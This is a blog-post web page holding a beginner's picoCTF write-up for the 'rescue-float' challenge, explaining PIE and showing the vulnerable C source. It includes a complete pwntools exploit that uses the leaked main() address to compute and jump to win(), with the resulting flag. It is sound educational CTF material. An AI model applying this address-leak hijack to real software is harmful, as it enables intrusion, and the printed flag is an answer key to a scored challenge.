<!DOCTYPE html>
<html lang="en" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>PicoCTF Writeup #490 | nullvm</title>
<meta name="keywords" content="ctf, binary exploit">
<meta name="description" content="Binary Exploitation Challenge (PIE &amp; Function Hijacking in picoCTF)
I‚Äôve always been fascinated by low-level programming and security, but up until now I hadn‚Äôt really tried a binary exploitation challenge. Recently, I stumbled upon this picoCTF challenge called ‚Äúrescue-float‚Äù ‚Äî and let me tell you, it was a mix of confusion, discovery, and a little bit of victory at the end.
This post is a casual walkthrough of how I approached it as a beginner. If you‚Äôre into Linux, development, or cybersecurity, you‚Äôll probably find this fun (or at least relatable if you remember your first binary exploitation adventure).">
<meta name="author" content="Deni Andrian Prayoga">
<link rel="canonical" href="/posts/picoctf-writeup-binary-exploit/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.ec03d813ea039cce70b66c029f89b0f5ee5f2e4fa806d9c6191739ac2c54bc8f.css" integrity="sha256-7APYE&#43;oDnM5wtmwCn4mw9e5fLk&#43;oBtnGGRc5rCxUvI8=" rel="preload stylesheet" as="style">
<link rel="icon" href="/favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
<link rel="apple-touch-icon" href="/apple-touch-icon.png">
<link rel="mask-icon" href="/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<link rel="alternate" hreflang="en" href="/posts/picoctf-writeup-binary-exploit/">
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Nunito:ital,wght@0,200..1000;1,200..1000&display=swap" rel="stylesheet">
<link href="https://fonts.googleapis.com/css2?family=Noto+Sans+JP:wght@100..900&display=swap" rel="stylesheet">


 <link href="https://fonts.googleapis.com/css2?family=Noto+Naskh+Arabic:wght@400..700&display=swap" rel="stylesheet">

<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
    <style>
        @media (prefers-color-scheme: dark) {
            :root {
                --theme: rgb(29, 30, 32);
                --entry: rgb(46, 46, 51);
                --primary: rgb(218, 218, 219);
                --secondary: rgb(155, 156, 157);
                --tertiary: rgb(65, 66, 68);
                --content: rgb(196, 196, 197);
                --code-block-bg: rgb(46, 46, 51);
                --code-bg: rgb(55, 56, 62);
                --border: rgb(51, 51, 51);
            }

            .list {
                background: var(--theme);
            }

            .list:not(.dark)::-webkit-scrollbar-track {
                background: 0 0;
            }

            .list:not(.dark)::-webkit-scrollbar-thumb {
                border-color: var(--theme);
            }
        }

    </style>
</noscript><meta property="og:url" content="/posts/picoctf-writeup-binary-exploit/">
  <meta property="og:site_name" content="nullvm">
  <meta property="og:title" content="PicoCTF Writeup #490">
  <meta property="og:description" content="Binary Exploitation Challenge (PIE &amp; Function Hijacking in picoCTF) I‚Äôve always been fascinated by low-level programming and security, but up until now I hadn‚Äôt really tried a binary exploitation challenge. Recently, I stumbled upon this picoCTF challenge called ‚Äúrescue-float‚Äù ‚Äî and let me tell you, it was a mix of confusion, discovery, and a little bit of victory at the end.
This post is a casual walkthrough of how I approached it as a beginner. If you‚Äôre into Linux, development, or cybersecurity, you‚Äôll probably find this fun (or at least relatable if you remember your first binary exploitation adventure).">
  <meta property="og:locale" content="en-us">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2025-08-19T14:20:15+07:00">
    <meta property="article:modified_time" content="2025-08-19T14:20:15+07:00">
    <meta property="article:tag" content="Ctf">
    <meta property="article:tag" content="Binary Exploit">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="PicoCTF Writeup #490">
<meta name="twitter:description" content="Binary Exploitation Challenge (PIE &amp; Function Hijacking in picoCTF)
I‚Äôve always been fascinated by low-level programming and security, but up until now I hadn‚Äôt really tried a binary exploitation challenge. Recently, I stumbled upon this picoCTF challenge called ‚Äúrescue-float‚Äù ‚Äî and let me tell you, it was a mix of confusion, discovery, and a little bit of victory at the end.
This post is a casual walkthrough of how I approached it as a beginner. If you‚Äôre into Linux, development, or cybersecurity, you‚Äôll probably find this fun (or at least relatable if you remember your first binary exploitation adventure).">


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "Posts",
      "item": "/posts/"
    }
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "PicoCTF Writeup #490",
      "item": "/posts/picoctf-writeup-binary-exploit/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "PicoCTF Writeup #490",
  "name": "PicoCTF Writeup #490",
  "description": "Binary Exploitation Challenge (PIE \u0026amp; Function Hijacking in picoCTF) I‚Äôve always been fascinated by low-level programming and security, but up until now I hadn‚Äôt really tried a binary exploitation challenge. Recently, I stumbled upon this picoCTF challenge called ‚Äúrescue-float‚Äù ‚Äî and let me tell you, it was a mix of confusion, discovery, and a little bit of victory at the end.\nThis post is a casual walkthrough of how I approached it as a beginner. If you‚Äôre into Linux, development, or cybersecurity, you‚Äôll probably find this fun (or at least relatable if you remember your first binary exploitation adventure).\n",
  "keywords": [
    "ctf", "binary exploit"
  ],
  "articleBody": "Binary Exploitation Challenge (PIE \u0026 Function Hijacking in picoCTF) I‚Äôve always been fascinated by low-level programming and security, but up until now I hadn‚Äôt really tried a binary exploitation challenge. Recently, I stumbled upon this picoCTF challenge called ‚Äúrescue-float‚Äù ‚Äî and let me tell you, it was a mix of confusion, discovery, and a little bit of victory at the end.\nThis post is a casual walkthrough of how I approached it as a beginner. If you‚Äôre into Linux, development, or cybersecurity, you‚Äôll probably find this fun (or at least relatable if you remember your first binary exploitation adventure).\nThe Challenge Setup We‚Äôre given a binary and its source code. The task is to ‚Äútry to get the flag‚Äù while keeping in mind that PIE (Position Independent Executable) is enabled.\nWhen you run the binary, it prints the address of main and asks for an address to jump to:\n$ ./vuln Address of main: 0x55709267a33d Enter the address to jump to, ex =\u003e 0x12345: 0x80 Your input: 80 Segfault Occurred, incorrect address. On the remote server, the behavior is the same ‚Äî except the addresses are totally different each time. That got me thinking: what‚Äôs going on here?\nFirst Observations Digging into the binary with strings, I spotted something very interesting:\nSegfault Occurred, incorrect address. You won! flag.txt Cannot open file. That \"You won!\" string was a big clue. Clearly, there‚Äôs a win() function hidden in there that we need to call instead of crashing.\nSo the real trick is figuring out the runtime address of win().\nA Quick Detour: What‚Äôs PIE? At first, I thought PIE was about pie (yes, 3.14 üç∞). Turns out, PIE stands for Position Independent Executable.\nIn simple terms: every time you run the program, its code is loaded into a different random memory location. That means addresses of functions like main() or win() change constantly.\nTo exploit it, you need to:\nLeak one known address (in this case, the program conveniently prints the address of main()). Use that to calculate the base address of the binary in memory. From there, compute the real address of win(). Peeking at the Source Here‚Äôs the core of the challenge:\nint main() { signal(SIGSEGV, segfault_handler); setvbuf(stdout, NULL, _IONBF, 0); printf(\"Address of main: %p\\n\", \u0026main); unsigned long val; printf(\"Enter the address to jump to, ex =\u003e 0x12345: \"); scanf(\"%lx\", \u0026val); printf(\"Your input: %lx\\n\", val); void (*foo)(void) = (void (*)())val; foo(); } Yep, the program literally takes your input, interprets it as a function pointer, and jumps there. If you guess wrong? Segfault. Guess right? Profit.\nExploit Development (with Pwntools) I used pwntools, which makes life much easier for challenges like this. The plan:\nLeak the runtime address of main. Compute the PIE base address. Add the offset of win() to get its actual address. Send that address back as input. Here‚Äôs the final script:\nfrom pwn import * HOST = \"rescued-float.picoctf.net\" PORT = 63489 # (check challenge for actual port) elf = context.binary = ELF(\"./vuln\") p = remote(HOST, PORT) # Leak main() p.recvuntil(b\"Address of main: \") leaked_main = int(p.recvline().strip(), 16) log.info(f\"Leaked main: {hex(leaked_main)}\") # Compute PIE base pie_base = leaked_main - elf.sym['main'] elf.address = pie_base log.info(f\"PIE base: {hex(pie_base)}\") # Compute win() win_addr = elf.sym['win'] log.success(f\"win() at: {hex(win_addr)}\") # Send it p.recvuntil(b\"Enter the address to jump to\") p.sendline(hex(win_addr).encode()) # Get the flag print(p.recvall().decode(errors=\"ignore\")) And boom ‚Äî the output:\nYou won! picoCTF{b4s1c_p051t10n_1nd3p3nd3nc3_cb52e722} Reflections Honestly, this was overwhelming at first. I had to Google like crazy, read about PIE, function pointers, and pwntools usage. But that‚Äôs the fun part ‚Äî these challenges force you to learn by doing.\nKey takeaways for me:\nPIE randomizes addresses, but once you leak one function‚Äôs address, you can recover the rest. Binary exploitation isn‚Äôt always about buffer overflows. Sometimes, the vulnerability is right in front of you (like letting the user call any address they want). Pwntools is an absolute lifesaver. Final Thoughts If you‚Äôre new to binary exploitation like me, this challenge is a fantastic first step. You‚Äôll get a feel for memory addresses, PIE, and how attackers chain small leaks into bigger exploits.\nAlso, remember: it‚Äôs okay to feel lost at first. Every expert you admire in Linux, development, or security once stared at a disassembly dump and thought, ‚ÄúWhat on earth is this?‚Äù\nThe best advice? Keep poking, keep experimenting, and don‚Äôt be afraid to Google shamelessly.\n",
  "wordCount" : "724",
  "inLanguage": "en",
  "datePublished": "2025-08-19T14:20:15+07:00",
  "dateModified": "2025-08-19T14:20:15+07:00",
  "author":{
    "@type": "Person",
    "name": "Deni Andrian Prayoga"
  },
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "/posts/picoctf-writeup-binary-exploit/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "nullvm",
    "logo": {
      "@type": "ImageObject",
      "url": "/favicon.ico"
    }
  }
}
</script>
</head>

<body class="" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "dark") {
        document.body.classList.add('dark');
    } else if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        document.body.classList.add('dark');
    }

</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="/" accesskey="h" title="nullvm (Alt + H)">nullvm</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="/posts" title="Post">
                    <span>Post</span>
                </a>
            </li>
            <li>
                <a href="/archives" title="Archive">
                    <span>Archive</span>
                </a>
            </li>
            <li>
                <a href="/tags" title="Tags">
                    <span>Tags</span>
                </a>
            </li>
            <li>
                <a href="/search" title="Search (Alt &#43; /)" accesskey=/>
                    <span>Search</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    
    <h1 class="post-title entry-hint-parent">
      PicoCTF Writeup #490
    </h1>
    <div class="post-meta"><span title='2025-08-19 14:20:15 +0700 +07'>August 19, 2025</span>&nbsp;¬∑&nbsp;4 min&nbsp;¬∑&nbsp;Deni Andrian Prayoga&nbsp;|&nbsp;<a href="https://github.com/nullvm/nullvm.github.io-precompiled/tree/main/content/posts/picoctf-writeup-binary-exploit.md" rel="noopener noreferrer edit" target="_blank">Suggest Changes</a>

</div>
  </header> 
  <div class="post-content"><h2 id="binary-exploitation-challenge-pie--function-hijacking-in-picoctf">Binary Exploitation Challenge (PIE &amp; Function Hijacking in picoCTF)<a hidden class="anchor" aria-hidden="true" href="#binary-exploitation-challenge-pie--function-hijacking-in-picoctf">#</a></h2>
<p>I‚Äôve always been fascinated by low-level programming and security, but up until now I hadn‚Äôt really tried a <strong>binary exploitation challenge</strong>. Recently, I stumbled upon <a href="https://play.picoctf.org/practice/challenge/490">this picoCTF challenge</a> called <em>‚Äúrescue-float‚Äù</em> ‚Äî and let me tell you, it was a mix of confusion, discovery, and a little bit of victory at the end.</p>
<p>This post is a casual walkthrough of how I approached it as a beginner. If you‚Äôre into Linux, development, or cybersecurity, you‚Äôll probably find this fun (or at least relatable if you remember your first binary exploitation adventure).</p>
<h2 id="the-challenge-setup">The Challenge Setup<a hidden class="anchor" aria-hidden="true" href="#the-challenge-setup">#</a></h2>
<p>We‚Äôre given a binary and its source code. The task is to ‚Äútry to get the flag‚Äù while keeping in mind that <strong>PIE (Position Independent Executable)</strong> is enabled.</p>
<p>When you run the binary, it prints the address of <code>main</code> and asks for an address to jump to:</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ ./vuln
</span></span><span style="display:flex;"><span>Address of main: 0x55709267a33d
</span></span><span style="display:flex;"><span>Enter the address to jump to, <span style="color:#e06c75">ex</span> <span style="color:#56b6c2">=</span>&gt; 0x12345: 0x80
</span></span><span style="display:flex;"><span>Your input: <span style="color:#d19a66">80</span>
</span></span><span style="display:flex;"><span>Segfault Occurred, incorrect address.
</span></span></code></pre></div><p>On the remote server, the behavior is the same ‚Äî except the addresses are totally different each time. That got me thinking: <em>what‚Äôs going on here?</em></p>
<h2 id="first-observations">First Observations<a hidden class="anchor" aria-hidden="true" href="#first-observations">#</a></h2>
<p>Digging into the binary with <code>strings</code>, I spotted something very interesting:</p>
<pre tabindex="0"><code>Segfault Occurred, incorrect address.
You won!
flag.txt
Cannot open file.
</code></pre><p>That <code>&quot;You won!&quot;</code> string was a big clue. Clearly, there‚Äôs a <code>win()</code> function hidden in there that we need to call instead of crashing.</p>
<p>So the real trick is figuring out the runtime address of <code>win()</code>.</p>
<h2 id="a-quick-detour-whats-pie">A Quick Detour: What‚Äôs PIE?<a hidden class="anchor" aria-hidden="true" href="#a-quick-detour-whats-pie">#</a></h2>
<p>At first, I thought PIE was about pie (yes, 3.14 üç∞). Turns out, PIE stands for <strong>Position Independent Executable</strong>.</p>
<p>In simple terms: every time you run the program, its code is loaded into a different random memory location. That means addresses of functions like <code>main()</code> or <code>win()</code> change constantly.</p>
<p>To exploit it, you need to:</p>
<ol>
<li>Leak one known address (in this case, the program conveniently prints the address of <code>main()</code>).</li>
<li>Use that to calculate the <strong>base address</strong> of the binary in memory.</li>
<li>From there, compute the real address of <code>win()</code>.</li>
</ol>
<h2 id="peeking-at-the-source">Peeking at the Source<a hidden class="anchor" aria-hidden="true" href="#peeking-at-the-source">#</a></h2>
<p>Here‚Äôs the core of the challenge:</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#e5c07b">int</span> <span style="color:#61afef;font-weight:bold">main</span>() {
</span></span><span style="display:flex;"><span>  <span style="color:#61afef;font-weight:bold">signal</span>(<span style="color:#e06c75">SIGSEGV</span>, <span style="color:#e06c75">segfault_handler</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#61afef;font-weight:bold">setvbuf</span>(<span style="color:#e06c75">stdout</span>, <span style="color:#e5c07b">NULL</span>, <span style="color:#e06c75">_IONBF</span>, <span style="color:#d19a66">0</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#61afef;font-weight:bold">printf</span>(<span style="color:#98c379">&#34;Address of main: %p</span><span style="color:#98c379">\n</span><span style="color:#98c379">&#34;</span>, <span style="color:#56b6c2">&amp;</span><span style="color:#e06c75">main</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#e5c07b">unsigned</span> <span style="color:#e5c07b">long</span> <span style="color:#e06c75">val</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#61afef;font-weight:bold">printf</span>(<span style="color:#98c379">&#34;Enter the address to jump to, ex =&gt; 0x12345: &#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#61afef;font-weight:bold">scanf</span>(<span style="color:#98c379">&#34;%lx&#34;</span>, <span style="color:#56b6c2">&amp;</span><span style="color:#e06c75">val</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#61afef;font-weight:bold">printf</span>(<span style="color:#98c379">&#34;Your input: %lx</span><span style="color:#98c379">\n</span><span style="color:#98c379">&#34;</span>, <span style="color:#e06c75">val</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#e5c07b">void</span> (<span style="color:#56b6c2">*</span><span style="color:#e06c75">foo</span>)(<span style="color:#e5c07b">void</span>) <span style="color:#56b6c2">=</span> (<span style="color:#e5c07b">void</span> (<span style="color:#56b6c2">*</span>)())<span style="color:#e06c75">val</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#61afef;font-weight:bold">foo</span>();
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Yep, the program literally takes your input, interprets it as a function pointer, and jumps there. If you guess wrong? <em>Segfault.</em> Guess right? <em>Profit.</em></p>
<h2 id="exploit-development-with-pwntools">Exploit Development (with Pwntools)<a hidden class="anchor" aria-hidden="true" href="#exploit-development-with-pwntools">#</a></h2>
<p>I used <strong>pwntools</strong>, which makes life much easier for challenges like this. The plan:</p>
<ol>
<li>Leak the runtime address of <code>main</code>.</li>
<li>Compute the PIE base address.</li>
<li>Add the offset of <code>win()</code> to get its actual address.</li>
<li>Send that address back as input.</li>
</ol>
<p>Here‚Äôs the final script:</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#c678dd">from</span> <span style="color:#e06c75">pwn</span> <span style="color:#c678dd">import</span> <span style="color:#56b6c2">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#e06c75">HOST</span> <span style="color:#56b6c2">=</span> <span style="color:#98c379">&#34;rescued-float.picoctf.net&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e06c75">PORT</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">63489</span>  <span style="color:#7f848e"># (check challenge for actual port)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#e06c75">elf</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">context</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">binary</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">ELF</span>(<span style="color:#98c379">&#34;./vuln&#34;</span>)
</span></span><span style="display:flex;"><span><span style="color:#e06c75">p</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">remote</span>(<span style="color:#e06c75">HOST</span>, <span style="color:#e06c75">PORT</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#7f848e"># Leak main()</span>
</span></span><span style="display:flex;"><span><span style="color:#e06c75">p</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">recvuntil</span>(<span style="color:#98c379">b</span><span style="color:#98c379">&#34;Address of main: &#34;</span>)
</span></span><span style="display:flex;"><span><span style="color:#e06c75">leaked_main</span> <span style="color:#56b6c2">=</span> <span style="color:#e5c07b">int</span>(<span style="color:#e06c75">p</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">recvline</span>()<span style="color:#56b6c2">.</span><span style="color:#e06c75">strip</span>(), <span style="color:#d19a66">16</span>)
</span></span><span style="display:flex;"><span><span style="color:#e06c75">log</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">info</span>(<span style="color:#98c379">f</span><span style="color:#98c379">&#34;Leaked main: </span><span style="color:#98c379">{</span><span style="color:#e5c07b">hex</span>(<span style="color:#e06c75">leaked_main</span>)<span style="color:#98c379">}</span><span style="color:#98c379">&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#7f848e"># Compute PIE base</span>
</span></span><span style="display:flex;"><span><span style="color:#e06c75">pie_base</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">leaked_main</span> <span style="color:#56b6c2">-</span> <span style="color:#e06c75">elf</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">sym</span>[<span style="color:#98c379">&#39;main&#39;</span>]
</span></span><span style="display:flex;"><span><span style="color:#e06c75">elf</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">address</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">pie_base</span>
</span></span><span style="display:flex;"><span><span style="color:#e06c75">log</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">info</span>(<span style="color:#98c379">f</span><span style="color:#98c379">&#34;PIE base: </span><span style="color:#98c379">{</span><span style="color:#e5c07b">hex</span>(<span style="color:#e06c75">pie_base</span>)<span style="color:#98c379">}</span><span style="color:#98c379">&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#7f848e"># Compute win()</span>
</span></span><span style="display:flex;"><span><span style="color:#e06c75">win_addr</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">elf</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">sym</span>[<span style="color:#98c379">&#39;win&#39;</span>]
</span></span><span style="display:flex;"><span><span style="color:#e06c75">log</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">success</span>(<span style="color:#98c379">f</span><span style="color:#98c379">&#34;win() at: </span><span style="color:#98c379">{</span><span style="color:#e5c07b">hex</span>(<span style="color:#e06c75">win_addr</span>)<span style="color:#98c379">}</span><span style="color:#98c379">&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#7f848e"># Send it</span>
</span></span><span style="display:flex;"><span><span style="color:#e06c75">p</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">recvuntil</span>(<span style="color:#98c379">b</span><span style="color:#98c379">&#34;Enter the address to jump to&#34;</span>)
</span></span><span style="display:flex;"><span><span style="color:#e06c75">p</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">sendline</span>(<span style="color:#e5c07b">hex</span>(<span style="color:#e06c75">win_addr</span>)<span style="color:#56b6c2">.</span><span style="color:#e06c75">encode</span>())
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#7f848e"># Get the flag</span>
</span></span><span style="display:flex;"><span><span style="color:#e5c07b">print</span>(<span style="color:#e06c75">p</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">recvall</span>()<span style="color:#56b6c2">.</span><span style="color:#e06c75">decode</span>(<span style="color:#e06c75">errors</span><span style="color:#56b6c2">=</span><span style="color:#98c379">&#34;ignore&#34;</span>))
</span></span></code></pre></div><p>And boom ‚Äî the output:</p>
<pre tabindex="0"><code>You won!
picoCTF{b4s1c_p051t10n_1nd3p3nd3nc3_cb52e722}
</code></pre><h2 id="reflections">Reflections<a hidden class="anchor" aria-hidden="true" href="#reflections">#</a></h2>
<p>Honestly, this was overwhelming at first. I had to Google like crazy, read about PIE, function pointers, and pwntools usage. But that‚Äôs the fun part ‚Äî these challenges force you to learn by doing.</p>
<p>Key takeaways for me:</p>
<ul>
<li>PIE randomizes addresses, but once you leak one function‚Äôs address, you can recover the rest.</li>
<li>Binary exploitation isn‚Äôt always about buffer overflows. Sometimes, the vulnerability is right in front of you (like letting the user call any address they want).</li>
<li>Pwntools is an absolute lifesaver.</li>
</ul>
<h2 id="final-thoughts">Final Thoughts<a hidden class="anchor" aria-hidden="true" href="#final-thoughts">#</a></h2>
<p>If you‚Äôre new to binary exploitation like me, this challenge is a fantastic first step. You‚Äôll get a feel for memory addresses, PIE, and how attackers chain small leaks into bigger exploits.</p>
<p>Also, remember: it‚Äôs okay to feel lost at first. Every expert you admire in Linux, development, or security once stared at a disassembly dump and thought, <em>‚ÄúWhat on earth is this?‚Äù</em></p>
<p>The best advice? Keep poking, keep experimenting, and don‚Äôt be afraid to Google shamelessly.</p>


  </div>

  <footer class="post-footer">
    <ul class="post-tags">
      <li><a href="/tags/ctf/">ctf</a></li>
      <li><a href="/tags/binary-exploit/">binary exploit</a></li>
    </ul>
  </footer><div id="disqus_thread"></div>
<script>
    window.disqus_config = function () {
    
    
    
    };
    (function() {
        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
            return;
        }
        var d = document, s = d.createElement('script'); s.async = true;
        s.src = '//' + "deniandriancode-github-io" + '.disqus.com/embed.js';
        s.setAttribute('data-timestamp', +new Date());
        (d.head || d.body).appendChild(s);
    })();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
</article>
    </main>
    
<footer class="footer">
        <span>&copy; 2025 <a href="/">nullvm</a></span> ¬∑ 

    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>


<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
</body>

</html>
